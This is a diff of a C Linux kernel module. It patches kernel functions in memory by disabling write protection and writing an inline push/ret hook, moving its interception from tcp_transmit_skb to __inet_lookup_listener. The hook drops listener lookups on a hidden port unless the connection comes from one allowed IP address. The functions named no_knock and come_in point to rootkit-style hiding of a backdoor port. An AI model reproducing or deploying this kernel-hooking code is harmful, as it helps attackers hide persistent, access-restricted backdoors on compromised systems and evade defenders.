@@ -21,10 +21,14 @@
 #define wp() enable_wp()
 #define HIJACK_LEN 6
 
-static int (*orig_tcp_transmit_skb)(struct sock*, struct sk_buff*, int, gfp_t);
-static int my_tcp_transmit_skb(struct sock*, struct sk_buff*, int, gfp_t);
+static struct sock * (*orig_looklisten)(struct net*,struct inet_hashinfo*, const __be32,
+					__be16, const __be32, const unsigned short,
+					const int);
+static struct sock * my_looklisten(struct net*,struct inet_hashinfo*, const __be32,
+					__be16, const __be32, const unsigned short,
+					const int);
 
-static char transmit_skb_code[HIJACK_LEN];
+static char lookup_code[HIJACK_LEN];
 static char hjc[HIJACK_LEN] = {0x68,0x0,0x0,0x0,0x0,0xc3};
 static unsigned int *p_addr = (unsigned int*) (hjc+1);
 
@@ -66,45 +70,38 @@ unsigned int ipstr_to_int(char* ip_str)
 	return ret;
 }
 
-void hijack_transmit_skb(void){
-	adc.d64 = (unsigned long) my_tcp_transmit_skb;
+void hijack_looklisten(void){
+	adc.d64 = (unsigned long) my_looklisten;
 	*p_addr = adc.d32[0];
 	spin_lock(&hijack_lock);
-	memcpy(transmit_skb_code, orig_tcp_transmit_skb, HIJACK_LEN); //save old code
+	memcpy(lookup_code, orig_looklisten, HIJACK_LEN); //save old code
 	dp();
-	memcpy(orig_tcp_transmit_skb, &hjc, HIJACK_LEN); //inject our code
+	memcpy(orig_looklisten, &hjc, HIJACK_LEN); //inject our code
 	wp();
 	spin_unlock(&hijack_lock);
 }
 
-static int my_tcp_transmit_skb(struct sock * sk, struct sk_buff *skb, int clone_it, gfp_t gfp_mask){
-	int ret;
-	struct inet_sock *inet;
-	struct tcp_skb_cb *tcb;
-	//check stuff
-	
-	inet = inet_sk(sk);
-	tcb = TCP_SKB_CB(skb);
-	
-	if(ntohs(inet->inet_sport) == hidden_port){
-		printk(KERN_INFO "hidden port knocked!\n");
-		if(inet->inet_daddr == allowed_ip){
-			printk(KERN_INFO "everything ok.\n");
-		}
-		else {
-			tcb->tcp_flags &= ~TCPHDR_SYN;
-			tcb->tcp_flags |= TCPHDR_ACK;
-			tcb->tcp_flags |= TCPHDR_RST;
-		}
-	} 
-//	printk(KERN_INFO "dp %d sp %d sa %pI4 da %pI4\n", ntohs(inet->inet_dport), ntohs(inet->inet_sport),&inet->inet_saddr,&inet->inet_daddr);
-	//printk(KERN_INFO "flags: %x %d\n", tcb->tcp_flags);
+struct sock * my_looklisten(struct net* net,
+			struct inet_hashinfo* hashinfo, 
+			const __be32 saddr, __be16 sport,
+			const __be32 daddr, const unsigned short hnum,
+			const int dif){
+	struct sock * ret;
 
+	printk(KERN_INFO "Lookup: s %pI4 sp %hu d %pI4 dp %hu\n", &saddr, sport, &daddr, hnum);	
+
+	if(hnum == hidden_port){
+		if(saddr != allowed_ip){
+			printk(KERN_INFO "lookup denied.\n");
+			return 0;
+		}
+	}
+	printk(KERN_INFO "lookup allowed.\n");
 	spin_lock(&hijack_lock);
 	dp();
-	memcpy(orig_tcp_transmit_skb, transmit_skb_code, HIJACK_LEN);
-	ret = orig_tcp_transmit_skb(sk,skb,clone_it, gfp_mask);
-	memcpy(orig_tcp_transmit_skb, &hjc, HIJACK_LEN);
+	memcpy(orig_looklisten, lookup_code, HIJACK_LEN);
+	ret = orig_looklisten(net, hashinfo,saddr,sport,daddr,hnum,dif);
+	memcpy(orig_looklisten, &hjc, HIJACK_LEN);
 	wp();
 	spin_unlock(&hijack_lock);	
 
@@ -116,20 +113,22 @@ void no_knock(void){
 
 	printk(KERN_INFO "=================================\n");
 	
-	addr = (unsigned long *) kallsyms_lookup_name("tcp_transmit_skb");
-	orig_tcp_transmit_skb = (int (*)(struct sock *,struct sk_buff*, int, gfp_t))addr;
+	addr = (unsigned long *) kallsyms_lookup_name("__inet_lookup_listener");
+	orig_looklisten = (struct sock* (*)(struct net*,struct inet_hashinfo*, const __be32,
+					__be16, const __be32, const unsigned short,
+					const int))addr;
 
 	allowed_ip = ipstr_to_int(allowed_ip_str);	
 	printk(KERN_INFO "allowed ip: %pI4\n", &allowed_ip);
 	
-	hijack_transmit_skb();
+	hijack_looklisten();
 }
 
 
 void come_in(void){
 	spin_lock(&hijack_lock);
 	dp();
-	memcpy(orig_tcp_transmit_skb, transmit_skb_code, HIJACK_LEN);
+	memcpy(orig_looklisten, lookup_code, HIJACK_LEN);
 	wp();
 	spin_unlock(&hijack_lock);
 }
